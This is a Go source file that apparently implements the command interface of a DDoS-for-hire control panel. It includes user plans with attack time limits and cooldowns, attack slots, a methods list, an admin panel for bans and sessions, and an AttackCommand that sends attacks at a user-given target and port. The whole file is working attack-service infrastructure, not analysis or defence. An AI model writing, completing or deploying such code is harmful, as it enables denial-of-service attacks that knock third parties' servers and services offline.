package main

import (
	"crypto/rand"
	"crypto/sha512"
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/jedib0t/go-pretty/table"
)

var Methods = make(map[string]string)

func convertDurationToInt64(duration string) (int64, string) {
	if len(duration) < 2 {
		return -1, "Invalid argument for key: duration."
	}

	durationChar := duration[len(duration)-1:]
	durationN, err := strconv.ParseInt(duration[:len(duration)-1], 10, 64)
	if err != nil || durationN == 0 {
		return -1, "Invalid argument for key: duration."
	}

	switch durationChar {
	case "h":
		durationN = durationN * 3600
		break
	case "d":
		durationN = durationN * 86400
		break
	case "m":
		durationN = durationN * (86400 * 30)
		break
	case "y":
		durationN = durationN * ((86400 * 30) * 12)
		break
	default:
		return -1, "Invalid character used for duration."
	}

	if durationN < 0 {
		return -1, "Too long. Choose a shorter duration."
	}

	return durationN, ""
}

func MethodsCommand() string {
	methodsTable := table.NewWriter()

	methodsTable.AppendHeader(table.Row{"method", "info"})

	for method, info := range Methods {
		methodsTable.AppendRow(table.Row{fmt.Sprintf("!%s <target> time=<time> dport=<dport>", method), info})
	}

	methodsTable.SetStyle(table.StyleColoredGreenWhiteOnBlack)

	return strings.ReplaceAll(methodsTable.Render(), "\n", "\r\n") + "\r\n"
}

func HelpCommand(admin bool) string {
	helpTable := table.NewWriter()

	helpTable.AppendHeader(table.Row{"command", "usage", "info"})
	helpTable.AppendRows([]table.Row{
		{"help/?", "help/?", "Displays this screen"},
		{"cls/clear/c", "cls/clear/c", "Clears the terminal screen"},
		{"methods", "methods", "Shows all available methods"},
		{"info", "info", "Shows account information"},
		{"changepass", "changepass <new_password>", "Used to change your own password"},
		{"!<method_name>", "!<method_name> <target> time=<time> dport=<port>", "Used to start an attack"},
	})

	if admin {
		helpTable.AppendRows([]table.Row{
			{"adduser", "adduser <username> <admin> <max_time> <cooldown> <duration>", "Creates a new user"},
			{"extenduser", "extenduser <username> <duration>", "Used to add time to a users plan"},
			{"deluser", "deluser <username>", "Deletes a user"},
			{"getusers", "getusers", "Fetches all users"},
			{"resetpass", "resetpass <username>", "Used to reset the password of a user"},
			{"sessions", "sessions", "Shows all currently active sessions"},
			{"ongoing", "ongoing", "Shows all ongoing attacks"},
			{"ban", "ban <username> <reason>", "Bans a user from using the service"},
			{"unban", "unban <username> <reason>", "Bans a user from using the service"},
			{"dcall", "dcall", "Disconnects all currently connected users"},
			{"attacks", "attacks <on/off>", "Toggles the attack functionality"},
			{"reload", "reload <methods/config>", "Methods will be reloaded and updated"},
		})
	}

	helpTable.SetStyle(table.StyleColoredGreenWhiteOnBlack)

	return strings.ReplaceAll(helpTable.Render(), "\n", "\r\n") + "\r\n"
}

func ToggleAttacksCommand(cmd []string) string {
	if len(cmd) != 2 {
		if Settings.Attack.Enabled {
			return "Attacks are currently: \x1b[92menabled\x1b[97m."
		} else {
			return "Attacks are currently: \x1b[91mdisabled\x1b[97m."
		}
	}

	switch cmd[1] {
	case "on":
		Settings.Attack.Enabled = true
		return "Attacks \x1b[92menabled\x1b[97m."
	case "off":
		Settings.Attack.Enabled = false
		return "Attacks \x1b[91mdisabled\x1b[97m."
	default:
		if Settings.Attack.Enabled {
			return "Attacks are currently: \x1b[92menabled\x1b[97m."
		} else {
			return "Attacks are currently: \x1b[91mdisabled\x1b[97m."
		}
	}
}

func ReloadCommand(cmd []string) string {
	if len(cmd) != 2 {
		return "Invalid usage."
	}

	switch cmd[1] {
	case "methods":
		LoadMethods()
		return "Reloaded the methods file."
	case "config":
		LoadConfig()
		return "Reloaded the config file."
	default:
		return "Invalid argument."
	}
}

func ShowAccountInformation(s Session) string {
	usersTable := table.NewWriter()

	usersTable.AppendHeader(table.Row{"username", "admin", "max time", "cooldown", "expiry"})

	user, msg := GetUserInfo(s.Username)
	if msg != "" {
		return msg
	}

	usersTable.AppendRow(table.Row{s.Username, user.Admin, user.MaxTime, user.Cooldown,
		time.Unix(user.ExpiresAt, 0).Format("01/02/2006 15:04")})

	usersTable.SetStyle(table.StyleColoredGreenWhiteOnBlack)

	return strings.ReplaceAll(usersTable.Render(), "\n", "\r\n") + "\r\n"
}

func CreateUserCommand(cmd []string) string {
	var (
		username string
		password string
		admin    bool
		maxTime  int64
		cooldown int64
		duration int64
		err      error
	)

	if len(cmd) != 6 {
		return "Invalid usage."
	}

	username = cmd[1]

	admin, err = strconv.ParseBool(cmd[2])
	if err != nil {
		return "Invalid argument for key: admin."
	}

	maxTime, err = strconv.ParseInt(cmd[3], 10, 64)
	if err != nil {
		return "Invalid argument for key: maxTime."
	}

	cooldown, err = strconv.ParseInt(cmd[4], 10, 64)
	if err != nil {
		return "Invalid argument for key: cooldown."
	}

	duration, msg := convertDurationToInt64(cmd[5])
	if msg != "" {
		return msg
	}

	passBytes := make([]byte, 64)
	_, err = rand.Read(passBytes)
	if err != nil {
		return "Something went wrong generating the password. Try again."
	}

	hasher := sha512.New()
	hasher.Write(passBytes)
	password = hex.EncodeToString(hasher.Sum(nil))[:12]

	response, ok := CreateUser(username, password, admin, maxTime, cooldown, duration)
	if !ok {
		return response
	}
	return response + " Password: " + password
}

func ResetSelfPasswordCommand(cmd []string, username string) string {
	if len(cmd) != 2 {
		return "Invalid usage."
	}

	newPassword := cmd[1]

	msg, _ := ChangeUserPassword(username, newPassword)
	return msg
}

func ResetUserPasswordCommand(cmd []string) string {
	if len(cmd) != 2 {
		return "Invalid usage."
	}

	username := cmd[1]

	passBytes := make([]byte, 64)
	_, err := rand.Read(passBytes)
	if err != nil {
		return "Something went wrong generating the password. Try again."
	}

	hasher := sha512.New()
	hasher.Write(passBytes)
	newPassword := hex.EncodeToString(hasher.Sum(nil))[:12]

	msg, _ := ChangeUserPassword(username, newPassword)
	return msg
}

func ExtendUserCommand(cmd []string) string {
	if len(cmd) != 3 {
		return "Invalid usage."
	}

	duration, msg := convertDurationToInt64(cmd[2])
	if msg != "" {
		return msg
	}

	message, _ := RenewUser(cmd[1], duration)
	return message
}

func DeleteUserCommand(cmd []string) string {
	if len(cmd) != 2 {
		return "Invalid usage."
	}
	message, _ := DeleteUser(cmd[1])

	ActiveSessions.Range(func(key interface{}, value interface{}) bool {
		if key.(string) == cmd[1] {
			session := value.(Session)
			session.Disconnect("Your access has been removed.")
			return false
		}

		return true
	})

	return message
}

func GetUsersCommand() string {
	users, msg, ok := GetAllUsers()
	if !ok {
		return msg
	}

	usersTable := table.NewWriter()

	usersTable.AppendHeader(table.Row{"username", "admin", "max time", "cooldown", "expiry", "banned", "ban reason"})

	for _, user := range users {
		usersTable.AppendRow(table.Row{
			user.Username, user.Admin, user.MaxTime, user.Cooldown,
			time.Unix(user.ExpiresAt, 0).Format("01/02/2006 15:04"),
			user.Banned, user.BanReason,
		})
	}

	usersTable.SetStyle(table.StyleColoredGreenWhiteOnBlack)

	return strings.ReplaceAll(usersTable.Render(), "\n", "\r\n") + "\r\n"
}

func BanUserCommand(cmd []string) string {
	if len(cmd) < 3 {
		return "Invalid usage."
	}

	msg, _ := BanUser(cmd[1], strings.Join(cmd[2:], " "))

	ActiveSessions.Range(func(key interface{}, value interface{}) bool {
		if key.(string) == cmd[1] {
			session := value.(Session)
			session.Disconnect("You have been banned.")
			return false
		}

		return true
	})

	return msg
}

func UnbanUserCommand(cmd []string) string {
	if len(cmd) != 2 {
		return "Invalid usage."
	}

	msg, _ := UnbanUser(cmd[1])
	return msg
}

func GetActiveSessions() string {
	sessionsTable := table.NewWriter()

	sessionsTable.AppendHeader(table.Row{"username", "admin", "max time", "connected at"})

	ActiveSessions.Range(func(key interface{}, value interface{}) bool {
		session := value.(Session)

		sessionsTable.AppendRow(table.Row{
			session.Username, session.User.Admin, session.User.MaxTime,
			time.Unix(session.ConnectedAt, 0).Format("01/02/2006 15:04"),
		})

		return true
	})

	sessionsTable.SetStyle(table.StyleColoredGreenWhiteOnBlack)

	return strings.ReplaceAll(sessionsTable.Render(), "\n", "\r\n") + "\r\n"
}

func GetOngoingAttacks() string {
	attacksTable := table.NewWriter()

	attacksTable.AppendHeader(table.Row{"#", "target", "duration", "method", "attacker", "started at"})

	OngoingAttacks.Range(func(key interface{}, value interface{}) bool {
		attack := value.(*Attack)

		attacksTable.AppendRow(table.Row{
			key.(string), attack.Target, attack.Duration, attack.Method, attack.Attacker,
			time.Unix(attack.StartedAt, 0).Format("01/02/2006 15:04"),
		})

		return true
	})

	attacksTable.SetStyle(table.StyleColoredGreenWhiteOnBlack)

	return strings.ReplaceAll(attacksTable.Render(), "\n", "\r\n") + "\r\n"
}

func DisconnectAllCommand(self string) string {
	var i = 0

	ActiveSessions.Range(func(key interface{}, value interface{}) bool {
		session := value.(Session)
		if session.Username == self {
			return true
		}

		session.Disconnect("You have been disconnected by an admin")
		i++

		return true
	})

	return fmt.Sprintf("Successfully closed: %d sessions", i)
}

func AttackCommand(command string, s Session) string {
	var duration int64 = 0
	var dport int64 = 80
	var err error

	if !Settings.Attack.Enabled {
		return "Attacks are globally disabled at the moment. Try again later"
	}

	if !AreAttackSlotsFree() {
		return fmt.Sprintf("Currently all %d attack slots are occupied. This can also be seen in the title bar ;)",
			Settings.Attack.MaxSlots)
	}

	if msg := IsUserOnCooldown(s.Username); msg != "" {
		return msg
	}

	cmdSlice := strings.Split(command, " ")

	method := cmdSlice[0][1:]

	if _, exists := Methods[method]; !exists {
		return fmt.Sprintf("Method: %s does not exist.", method)
	}

	if len(cmdSlice) < 3 || len(cmdSlice) > 4 {
		return fmt.Sprintf("Invalid usage.\r\n!%s <target> dport=<dport> time=<time>", method)
	}

	target := cmdSlice[1]

	splitSlice := strings.Split(cmdSlice[2], "=")
	if len(splitSlice) != 2 {
		return "Invalid flag: " + cmdSlice[2]
	}

	switch splitSlice[0] {
	case "time":
		duration, err = strconv.ParseInt(splitSlice[1], 10, 64)
		if err != nil {
			return "Invalid usage of time flag."
		}
		break
	case "dport":
		dport, err = strconv.ParseInt(splitSlice[1], 10, 64)
		if err != nil {
			return "Invalid usage of dport flag."
		}
		break
	}

	if len(cmdSlice) == 4 {
		splitSlice = strings.Split(cmdSlice[3], "=")
		if len(splitSlice) != 2 {
			return "Invalid flag: " + cmdSlice[3]
		}
		switch splitSlice[0] {
		case "time":
			duration, err = strconv.ParseInt(splitSlice[1], 10, 64)
			if err != nil {
				return "Invalid usage of time flag."
			}
			break
		case "dport":
			dport, err = strconv.ParseInt(splitSlice[1], 10, 64)
			if err != nil {
				return "Invalid usage of dport flag."
			}
			break
		}
	}

	if duration == -1 {
		return "Invalid/no attack duration specified"
	} else if duration > s.User.MaxTime {
		return fmt.Sprintf("You can not send attacks longer than %d seconds",
			s.User.MaxTime)
	}

	if dport < 0 || dport > 65535 {
		return "Invalid port specified. Valid range: 0 - 65535"
	}

	attack := Attack{
		Attacker:  s.Username,
		Target:    target,
		Duration:  duration,
		Port:      dport,
		Method:    method,
		StartedAt: time.Now().Unix(),
	}

	if msg := attack.Send(); msg != "" {
		return msg
	}

	PutUserOnCooldown(s.Username, s.User.Cooldown)
	attack.Store()

	return "Attack sent successfully."
}
